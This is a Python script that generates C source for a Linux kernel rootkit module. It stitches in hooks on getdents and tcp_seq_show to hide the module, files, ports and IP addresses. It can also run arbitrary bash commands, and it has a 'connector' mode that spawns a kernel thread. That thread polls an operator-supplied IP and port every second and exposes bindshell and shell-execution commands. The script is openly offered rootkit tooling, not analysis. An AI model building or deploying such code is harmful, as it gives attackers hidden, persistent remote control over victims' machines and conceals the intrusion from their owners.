#!/usr/bin/env python3

class TemplateGenerator:

    def __init__(self):
        self.template_head = """
        #include <linux/init.h>
        #include <linux/module.h>
        #include <linux/kernel.h>
        #include <linux/sched.h>
        #include <linux/sched/signal.h>
        #include <linux/delay.h>

        #include <linux/kthread.h>  
        #include <linux/wait.h>

        MODULE_LICENSE("GPL");
        MODULE_AUTHOR("default");
        MODULE_DESCRIPTION("module");
        MODULE_VERSION("0.01");

        """

        self.template_init = ""
        self.template_end = ""
        self.template_clear = ""
        self.connector = False


    def generate(self):
        if self.template_end == "":
            self.template_end = """
            static int __init rootkit_example_init(void) 
            {
                init_rootkit();
                return 0;
            }
            static void __exit rootkit_example_exit(void) 
            {
                clear_rootkit();
            }
            """
        self.template_end += """
        module_init(rootkit_example_init);
        module_exit(rootkit_example_exit);
        """

        template = self.template_head + "void init_rootkit(void) {\n" + self.template_init + "\n}\n" + "void clear_rootkit(void) {\n" + self.template_clear + "\n}\n" + self.template_end
        return template


    def hideme(self, arg):
        if arg:
            if not self.connector:
                self.template_head += "#include \"mods/hideme.h\" \n"
            self.template_init += "hideme();\n"

        
    def hide_dent(self, items):
        if not self.connector:
            self.template_head += "#include \"hooker/getdents.h\"\n"
            self.template_head += "#include \"mods/hidedent.h\"\n"
            self.template_init += "install_getdents_hook();\n"
            self.template_clear += "remove_getdents_hook();\n"

        for x in items:
            self.template_init += "hide_dent(\""+x+"\");\n"


    def hide_port(self, items):
        if not self.connector:
            self.template_head += "#include \"hooker/tcp_seq_show.h\"\n"
            self.template_head += "#include \"mods/hideport.h\"\n"
            self.template_init += "install_tcp_seq_show_hook();\n"
            self.template_clear += "remove_tcp_seq_show_hook();\n"

        for x in items:
            self.template_init += "hide_port(\""+x+"\");\n"
    

    def hide_ip(self, items, hooked):
        if not self.connector:
            self.template_head += "#include \"hooker/tcp_seq_show.h\"\n"
            self.template_head += "#include \"mods/hideip.h\"\n"
            if not hooked:
                self.template_init += "install_tcp_seq_show_hook();\n"
                self.template_clear += "remove_tcp_seq_show_hook();\n"

        for x in items:
            self.template_init += "hide_ip(\""+x+"\");\n"


    def shells(self, items):
        if not self.connector:
            self.template_head += "#include \"mods/runshell.h\"\n"

        for x in items:
            self.template_init += "run_custom_bash(\""+x+"\");\n"
        

    def connector_generator(self, ip, port):
        self.connector = True 

        self.template_head += """
        #include "connector.h"
        #include "hooker/getdents.h"
        #include "hooker/tcp_seq_show.h"

        #include "mods/hideme.h"
        #include "mods/hidedent.h"
        #include "mods/hideport.h"
        #include "mods/hideip.h"
        #include "mods/bindshell.h"
        #include "mods/runshell.h"
        """

        self.template_init += """

        install_getdents_hook();
        install_tcp_seq_show_hook();

        add_function("HIDEME", hideme);
        add_function("SHOWME", showme);
        add_function("HIDE_DENT", hide_dent);
        add_function("SHOW_HIDDEN_DENT", show_hidden_dent);
        add_function("HIDE_PORT", hide_port);
        add_function("SHOW_HIDDEN_PORT", show_hidden_port);
        add_function("HIDE_IP", hide_ip);
        add_function("SHOW_HIDDEN_IP", show_hidden_ip);
        add_function("BINDSHELL_CREATE", bindshell_create);
        add_function("RUN_CUSTOM_BASH", run_custom_bash);
        """

        self.template_clear += """
        remove_getdents_hook();
        remove_tcp_seq_show_hook();
        clear_functions();
        """

        self.template_end = """
        DECLARE_WAIT_QUEUE_HEAD(runner_wait_queue);

        struct task_struct *runner_task = NULL;
        int runner(void *ptr) {
            DECLARE_WAITQUEUE(wq, current);
            add_wait_queue(&runner_wait_queue, &wq);
            while (!kthread_should_stop()) {
                connector("""
        self.template_end += "\""+ip+"\", "+port+");"
        self.template_end += """
                msleep(1000);
            }
            set_current_state(TASK_RUNNING);
            remove_wait_queue(&runner_wait_queue, &wq);
            return 0;
        }

        static int __init rootkit_example_init(void) 
        {
            init_rootkit();

            runner_task = kthread_run(runner, NULL, "kthread_module");
            if (runner_task) {
                get_task_struct(runner_task);
                msleep(1000);
                wake_up(&runner_wait_queue);
            }
            return 0;
        }
        static void __exit rootkit_example_exit(void) 
        {
            kthread_stop(runner_task);
            clear_rootkit();
        }
        """

